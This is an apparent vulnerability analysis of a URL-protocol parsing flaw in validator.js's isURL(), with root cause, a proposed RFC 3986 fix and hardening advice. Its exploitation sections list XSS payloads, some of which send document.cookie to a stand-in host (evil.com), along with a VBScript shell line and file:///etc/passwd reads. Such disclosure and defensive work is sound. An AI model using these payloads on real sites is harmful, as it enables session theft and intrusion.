# CVE-2025-56200 Detailed Vulnerability Analysis

## Executive Summary

CVE-2025-56200 is a protocol parsing vulnerability in the `isURL()` function of validator.js that allows attackers to bypass protocol validation. The vulnerability exists because the function uses `'://'` as a delimiter to parse protocols, while web browsers use `':'` as defined in RFC 3986. This discrepancy enables attackers to craft malicious URLs that pass validation but are interpreted as dangerous protocols (javascript:, data:, vbscript:) by browsers, leading to Cross-Site Scripting (XSS) and other attacks.

**Severity:** Moderate (CVSS 6.1)
**Attack Vector:** Network
**Impact:** XSS, Open Redirect, Protocol Confusion

---

## 1. Technical Root Cause

### 1.1 The Vulnerable Code

**File:** `/Users/laptopname/validator.js/src/lib/isURL.js`
**Line:** 86

```javascript
split = url.split('://');
if (split.length > 1) {
  protocol = split.shift().toLowerCase();
  if (options.require_valid_protocol && options.protocols.indexOf(protocol) === -1) {
    return false;
  }
} else if (options.require_protocol) {
  return false;
}
```

### 1.2 Why This Is Wrong

According to **RFC 3986 (Uniform Resource Identifier: Generic Syntax)**, a URI is defined as:

```
URI = scheme ":" hier-part [ "?" query ] [ "#" fragment ]
```

The **scheme** (protocol) is separated from the rest of the URI by a **single colon** (`:`), NOT by `://`.

The `://` pattern is part of the **hier-part** for authority-based URIs:

```
hier-part = "//" authority path-abempty
          / path-absolute
          / path-rootless
          / path-empty
```

**Authority-based URIs** (like HTTP, HTTPS, FTP) have the format:
```
scheme "://" authority path
```

**Non-authority URIs** (like javascript:, data:, mailto:) have the format:
```
scheme ":" path
```

### 1.3 The Discrepancy

| URL Type | Example | validator.js Parsing | Browser Parsing | Match? |
|----------|---------|---------------------|-----------------|--------|
| Authority-based | `http://example.com` | Protocol: `http` | Protocol: `http` | ✓ YES |
| Authority-based | `https://example.com` | Protocol: `https` | Protocol: `https` | ✓ YES |
| **Non-authority** | `javascript:alert(1)` | **NO protocol** (no `://`) | **Protocol: `javascript`** | ✗ **NO** |
| **Non-authority** | `data:text/html,...` | **NO protocol** (no `://`) | **Protocol: `data`** | ✗ **NO** |
| **Non-authority** | `vbscript:msgbox(1)` | **NO protocol** (no `://`) | **Protocol: `vbscript`** | ✗ **NO** |

This mismatch is the **root cause** of the vulnerability.

---

## 2. Exploitation Scenarios

### 2.1 Scenario 1: XSS via javascript: Protocol

**Attack Flow:**
1. Attacker submits URL: `javascript:alert(document.cookie)`
2. Backend validates with `validator.isURL(url)`
3. validator.js: `url.split('://')` → `['javascript:alert(document.cookie)']`
4. No `://` found → No protocol detected
5. URL treated as potential hostname → May pass validation (depending on config)
6. URL stored in database
7. Frontend renders: `<a href="javascript:alert(document.cookie)">Click here</a>`
8. Browser interprets `javascript:` as protocol
9. User clicks link → JavaScript executes → **XSS**

**Example Payloads:**
```javascript
javascript:alert(1)
javascript:alert(document.domain)
javascript:alert(document.cookie)
javascript:fetch('https://evil.com?c='+document.cookie)
javascript:window.location='https://evil.com?c='+document.cookie
javascript:eval(atob('YWxlcnQoMSk='))
```

### 2.2 Scenario 2: XSS via data: URI

**Attack Flow:**
1. Attacker submits: `data:text/html,<script>alert(1)</script>`
2. validator.js: No `://` found → No protocol detected
3. May pass validation
4. Frontend: `<a href="data:text/html,<script>alert(1)</script>">Link</a>`
5. User clicks → Browser renders HTML → **XSS**

**Example Payloads:**
```javascript
data:text/html,<script>alert(1)</script>
data:text/html,<img src=x onerror=alert(1)>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
data:image/svg+xml,<svg onload=alert(1)>
data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

### 2.3 Scenario 3: Open Redirect Attack

**Attack Flow:**
1. Application uses validator.js to validate redirect URLs
2. Attacker crafts: `javascript://trusted-site.com/%0d%0aalert(1)`
3. validator.js: Has `://` → Protocol is `javascript` (may be in whitelist?)
4. Or attacker uses: `javascript:void(location='https://evil.com')`
5. No `://` → No protocol detected → May pass
6. Application redirects user
7. Browser executes JavaScript → Redirects to evil.com

### 2.4 Scenario 4: Legacy Browser Exploitation (IE)

For older Internet Explorer versions:

```javascript
vbscript:msgbox("XSS")
VBScript:CreateObject("WScript.Shell").Run("calc")
```

### 2.5 Scenario 5: File Disclosure (Less Common)

If validator is used to validate URLs for server-side fetching:

```javascript
file:///etc/passwd
file:///c:/windows/system.ini
file://localhost/etc/hosts
```

---

## 3. Vulnerable Code Analysis

Let's trace through the vulnerable code with a malicious payload:

### Input: `javascript:alert(1)`

```javascript
// Line 80-84: Fragment and query handling
split = url.split('#');
url = split.shift(); // url = "javascript:alert(1)"

split = url.split('?');
url = split.shift(); // url = "javascript:alert(1)"

// Line 86: The vulnerable split
split = url.split('://');
// split = ["javascript:alert(1)"]
// split.length = 1

// Line 87: Check if protocol was found
if (split.length > 1) {
  // NOT EXECUTED because split.length = 1
  protocol = split.shift().toLowerCase();
  if (options.require_valid_protocol && options.protocols.indexOf(protocol) === -1) {
    return false;
  }
} else if (options.require_protocol) {
  // If require_protocol is true, this returns false
  // BUT if require_protocol is false (default), continues...
  return false;
} else if (url.slice(0, 2) === '//') {
  // NOT EXECUTED: "javascript:alert(1)" doesn't start with '//'
  if (!options.allow_protocol_relative_urls) {
    return false;
  }
  split[0] = url.slice(2);
}

// Line 100: Reconstruct URL
url = split.join('://');
// url = "javascript:alert(1)" (unchanged)

// Continues to host parsing...
// Line 106
split = url.split('/');
url = split.shift();
// url = "javascript:alert(1)" (no slash)

// Line 113-130: Auth parsing
split = url.split('@');
// split = ["javascript:alert(1)"]
// May get confused, treating "javascript:alert(1)" as hostname

// Eventually may PASS validation or FAIL depending on hostname validation
// BUT the protocol is NEVER checked!
```

### The Problem

1. **No protocol detected:** Because there's no `://`, `split.length = 1`
2. **Protocol validation skipped:** The `require_valid_protocol` check never runs
3. **URL continues processing:** Treated as a hostname or path
4. **May pass validation:** Depending on subsequent hostname validation
5. **Browser interprets differently:** Browser sees `javascript:` as a protocol

---

## 4. Impact Analysis

### 4.1 Attack Types Enabled

| Attack Type | Severity | Description |
|-------------|----------|-------------|
| **Cross-Site Scripting (XSS)** | High | Execute arbitrary JavaScript in victim's browser |
| **Cookie Theft** | High | Steal session cookies and authentication tokens |
| **Credential Harvesting** | High | Redirect to phishing pages or inject login forms |
| **Open Redirect** | Medium | Redirect users to malicious sites |
| **Protocol Confusion** | Medium | Exploit application logic that assumes safe protocols |
| **File Disclosure** | Low | Access local files (limited scenarios) |

### 4.2 Real-World Impact

**Applications at Risk:**
- URL shorteners
- Social media platforms
- Comment systems
- User profile pages
- Content management systems
- Any application accepting user-submitted URLs

**Example Attack Chain:**
1. Social media site uses validator.js to validate profile URLs
2. Attacker sets profile URL to `javascript:fetch('https://evil.com?c='+document.cookie)`
3. Validation passes (no protocol detected)
4. Victim views attacker's profile
5. Clicks on profile link
6. Browser executes JavaScript
7. Session cookie sent to attacker
8. Attacker hijacks victim's session

### 4.3 CVSS Score Breakdown

**CVSS 3.1 Score: 6.1 (Medium)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
```

- **AV:N** (Attack Vector: Network) - Exploitable remotely
- **AC:L** (Attack Complexity: Low) - No special conditions required
- **PR:N** (Privileges Required: None) - No authentication needed
- **UI:R** (User Interaction: Required) - Victim must click link
- **S:C** (Scope: Changed) - Affects resources beyond vulnerable component
- **C:L** (Confidentiality: Low) - Can read some data (cookies, tokens)
- **I:L** (Integrity: Low) - Can modify some data (XSS context)
- **A:N** (Availability: None) - No impact on availability

---

## 5. The Fix Explained

### 5.1 Corrected Protocol Parsing

Replace the vulnerable code with RFC 3986 compliant parsing:

```javascript
// RFC 3986 compliant protocol parsing
// Protocol (scheme) is defined as: scheme = ALPHA *( ALPHA / DIGIT / "+" / "-" / "." )
// and is separated from the rest of the URI by a single colon ":"
const protocolMatch = url.match(/^([a-zA-Z][a-zA-Z0-9+.\-]*):(.*)$/);

if (protocolMatch) {
  protocol = protocolMatch[1].toLowerCase();
  const remainder = protocolMatch[2];

  // Validate protocol against whitelist
  if (options.require_valid_protocol && options.protocols.indexOf(protocol) === -1) {
    return false;
  }

  // RFC 3986 defines authority-based URIs as having '//' after the colon
  if (remainder.startsWith('//')) {
    // Authority-based URI - this is expected for http, https, ftp, etc.
    url = remainder.substring(2);
  } else {
    // Non-authority URI detected (e.g., javascript:, data:, mailto:)
    // These should be rejected for security
    return false;
  }
} else if (options.require_protocol) {
  return false;
} else if (url.slice(0, 2) === '//') {
  if (!options.allow_protocol_relative_urls) {
    return false;
  }
  url = url.slice(2);
}
```

### 5.2 How the Fix Works

#### Step 1: RFC 3986 Compliant Protocol Extraction

**Regex:** `/^([a-zA-Z][a-zA-Z0-9+.\-]*):(.*)$/`

- `^` - Start of string
- `([a-zA-Z]` - Protocol MUST start with a letter
- `[a-zA-Z0-9+.\-]*` - Followed by letters, digits, `+`, `-`, or `.`
- `)` - Capture the protocol
- `:` - Single colon separator
- `(.*)$` - Capture everything after the colon

**Examples:**
```javascript
'http://example.com'  → ['http://example.com', 'http', '//example.com']
'javascript:alert(1)' → ['javascript:alert(1)', 'javascript', 'alert(1)']
'data:text/html,...'  → ['data:text/html,...', 'data', 'text/html,...']
'example.com'         → null (no match, no protocol)
```

#### Step 2: Distinguish Authority vs Non-Authority URIs

After extracting the protocol, check if the remainder starts with `//`:

**Authority-based (ALLOWED):**
```javascript
'http://example.com'  → remainder = '//example.com'  → ✓ Authority-based → Continue
'https://example.com' → remainder = '//example.com'  → ✓ Authority-based → Continue
'ftp://example.com'   → remainder = '//example.com'  → ✓ Authority-based → Continue
'file:///etc/passwd'  → remainder = '///etc/passwd'  → ✓ Authority-based → Continue
```

**Non-authority (REJECTED):**
```javascript
'javascript:alert(1)' → remainder = 'alert(1)'       → ✗ NO '//' → REJECT
'data:text/html,...'  → remainder = 'text/html,...'  → ✗ NO '//' → REJECT
'mailto:test@ex.com'  → remainder = 'test@ex.com'    → ✗ NO '//' → REJECT
'vbscript:msgbox(1)'  → remainder = 'msgbox(1)'      → ✗ NO '//' → REJECT
```

#### Step 3: Protocol Validation

The protocol is validated against the whitelist BEFORE checking authority:

```javascript
if (options.require_valid_protocol && options.protocols.indexOf(protocol) === -1) {
  return false; // Reject if protocol not in whitelist
}
```

This provides **defense in depth**: even if someone adds `javascript` to the protocols list, it would still be rejected in the next step because it's a non-authority URI.

### 5.3 Testing the Fix

#### Before Fix:
```javascript
validator.isURL('javascript:alert(1)')
// split = ['javascript:alert(1)']
// split.length = 1
// No protocol detected
// May PASS validation

validator.isURL('data:text/html,<script>alert(1)</script>')
// split = ['data:text/html,<script>alert(1)</script>']
// No protocol detected
// May PASS validation
```

#### After Fix:
```javascript
validator.isURL('javascript:alert(1)')
// protocolMatch = ['javascript:alert(1)', 'javascript', 'alert(1)']
// protocol = 'javascript'
// remainder = 'alert(1)'
// remainder.startsWith('//') = false
// return false → ✓ REJECTED

validator.isURL('data:text/html,<script>alert(1)</script>')
// protocolMatch = ['data:text/html,...', 'data', 'text/html,...']
// protocol = 'data'
// remainder = 'text/html,...'
// remainder.startsWith('//') = false
// return false → ✓ REJECTED

validator.isURL('http://example.com')
// protocolMatch = ['http://example.com', 'http', '//example.com']
// protocol = 'http'
// remainder = '//example.com'
// remainder.startsWith('//') = true
// url = 'example.com'
// Continue validation → ✓ PASS (if valid domain)
```

---

## 6. Edge Cases Handled

### 6.1 Protocol Format Validation

The regex enforces RFC 3986 protocol format:

| Input | Valid? | Reason |
|-------|--------|--------|
| `http://example.com` | ✓ YES | Starts with letter, followed by alphanumeric |
| `h2://example.com` | ✓ YES | Contains digit (valid per RFC) |
| `http+tls://example.com` | ✓ YES | Contains `+` (valid per RFC) |
| `my-protocol://example.com` | ✓ YES | Contains `-` (valid per RFC) |
| `my.protocol://example.com` | ✓ YES | Contains `.` (valid per RFC) |
| `123://example.com` | ✗ NO | Starts with digit (invalid) |
| `-protocol://example.com` | ✗ NO | Starts with `-` (invalid) |
| `.protocol://example.com` | ✗ NO | Starts with `.` (invalid) |
| `http_proto://example.com` | ✗ NO | Contains `_` (invalid) |

### 6.2 Case Sensitivity

Protocols are normalized to lowercase:

```javascript
validator.isURL('HTTP://example.com')    // ✓ PASS → 'http'
validator.isURL('HTTPS://example.com')   // ✓ PASS → 'https'
validator.isURL('JavaScript:alert(1)')   // ✗ FAIL → 'javascript' (rejected)
validator.isURL('DATA:text/html,...')    // ✗ FAIL → 'data' (rejected)
```

### 6.3 Protocol-Relative URLs

Protocol-relative URLs (`//example.com`) are still supported:

```javascript
validator.isURL('//example.com', { allow_protocol_relative_urls: true })
// protocolMatch = null (no protocol)
// url.slice(0, 2) === '//' → true
// url = 'example.com'
// Continue validation → ✓ PASS
```

### 6.4 File URLs

File URLs are authority-based (have `//` or `///`):

```javascript
validator.isURL('file:///etc/passwd', {
  protocols: ['file'],
  require_host: false,
  require_tld: false
})
// protocolMatch = ['file:///etc/passwd', 'file', '///etc/passwd']
// protocol = 'file' → in whitelist
// remainder = '///etc/passwd'
// remainder.startsWith('//') = true → ✓ Authority-based
// url = '/etc/passwd'
// Continue validation → ✓ PASS
```

### 6.5 Custom Protocols

Custom authority-based protocols work:

```javascript
validator.isURL('myapp://host/path', {
  protocols: ['myapp'],
  require_tld: false
})
// protocolMatch = ['myapp://host/path', 'myapp', '//host/path']
// protocol = 'myapp' → in whitelist
// remainder = '//host/path'
// remainder.startsWith('//') = true → ✓ Authority-based
// url = 'host/path'
// Continue validation → ✓ PASS
```

Custom non-authority protocols are rejected:

```javascript
validator.isURL('myapp:data', {
  protocols: ['myapp'],
  require_valid_protocol: false
})
// protocolMatch = ['myapp:data', 'myapp', 'data']
// protocol = 'myapp'
// remainder = 'data'
// remainder.startsWith('//') = false → ✗ Non-authority
// return false → ✗ FAIL
```

---

## 7. Backward Compatibility

### 7.1 Breaking Changes

The following URLs will now be **correctly rejected** (they were incorrectly accepted before):

1. **Non-authority URIs:**
   - `javascript:alert(1)`
   - `data:text/html,...`
   - `vbscript:msgbox(1)`
   - `mailto:test@example.com`
   - `tel:+1234567890`

2. **Malformed URLs:**
   - `http:example.com` (missing `//`)
   - `http:/example.com` (only one `/`)

### 7.2 Non-Breaking

All legitimate URLs continue to work:

```javascript
validator.isURL('http://example.com')           // ✓ Still PASS
validator.isURL('https://example.com')          // ✓ Still PASS
validator.isURL('ftp://example.com')            // ✓ Still PASS
validator.isURL('example.com')                  // ✓ Still PASS (no protocol)
validator.isURL('//example.com', {
  allow_protocol_relative_urls: true
})                                               // ✓ Still PASS
```

### 7.3 Migration Path

If your application needs to validate email addresses or phone numbers, use specialized validators:

**Before:**
```javascript
validator.isURL('mailto:test@example.com') // Was incorrectly passing
```

**After:**
```javascript
// For emails, use the dedicated validator
validator.isEmail('test@example.com')

// For tel: URIs, write a custom validator or use a library
function isTelURI(str) {
  return /^tel:\+?[0-9\s\-().]+$/.test(str);
}
```

**For data: URIs:**
```javascript
// validator.js already has isDataURI()
validator.isDataURI('data:text/html,...')
```

---

## 8. Security Best Practices

### 8.1 After Applying the Patch

1. **Do not add dangerous protocols to whitelist:**
   ```javascript
   // DON'T DO THIS:
   validator.isURL(url, {
     protocols: ['http', 'https', 'javascript'], // ✗ BAD
     require_valid_protocol: true
   });

   // Even if you add 'javascript', it will still be rejected
   // because it's a non-authority URI, but don't rely on this
   ```

2. **Use Content Security Policy (CSP):**
   ```html
   <meta http-equiv="Content-Security-Policy"
         content="default-src 'self'; script-src 'self'">
   ```

3. **Context-aware output encoding:**
   ```javascript
   // When rendering URLs in href attributes, encode them:
   const safeUrl = escapeHtml(url);
   html += `<a href="${safeUrl}">Link</a>`;

   // Or use a library like DOMPurify:
   const safeUrl = DOMPurify.sanitize(url, { ALLOWED_URI_REGEXP: /^https?:/ });
   ```

4. **Validate on both client and server:**
   ```javascript
   // Client-side (user experience)
   if (!validator.isURL(url)) {
     showError('Invalid URL');
     return;
   }

   // Server-side (security)
   if (!validator.isURL(url)) {
     return res.status(400).json({ error: 'Invalid URL' });
   }
   ```

### 8.2 Defense in Depth

Don't rely solely on validator.js:

1. **URL Validation (validator.js)** - First line of defense
2. **Protocol Whitelist** - Only allow http/https
3. **Domain Whitelist** - Restrict to trusted domains if possible
4. **Content Security Policy** - Browser-level protection
5. **Output Encoding** - Escape when rendering
6. **Regular Security Audits** - Test for bypasses

---

## 9. Conclusion

CVE-2025-56200 demonstrates the importance of adhering to specifications (RFC 3986) when implementing security-critical functions. The discrepancy between using `://` vs `:` as a protocol delimiter created a dangerous gap that attackers could exploit for XSS and other attacks.

The fix ensures that:
1. Protocol parsing matches browser behavior
2. Non-authority URIs are explicitly rejected
3. Legitimate URLs continue to work
4. Defense in depth is provided (protocol validation + authority checking)

**Recommendation:** Apply the patch immediately and audit any code that uses `isURL()` for security-critical URL validation, especially in contexts where URLs are rendered in HTML attributes or used for redirects.

---

## 10. References

- **RFC 3986:** Uniform Resource Identifier (URI): Generic Syntax
  https://datatracker.ietf.org/doc/html/rfc3986

- **OWASP - Cross-site Scripting (XSS)**
  https://owasp.org/www-community/attacks/xss/

- **OWASP - Unvalidated Redirects and Forwards**
  https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html

- **CWE-79:** Improper Neutralization of Input During Web Page Generation
  https://cwe.mitre.org/data/definitions/79.html

- **CWE-601:** URL Redirection to Untrusted Site
  https://cwe.mitre.org/data/definitions/601.html

- **CVSS v3.1 Calculator**
  https://www.first.org/cvss/calculator/3.1
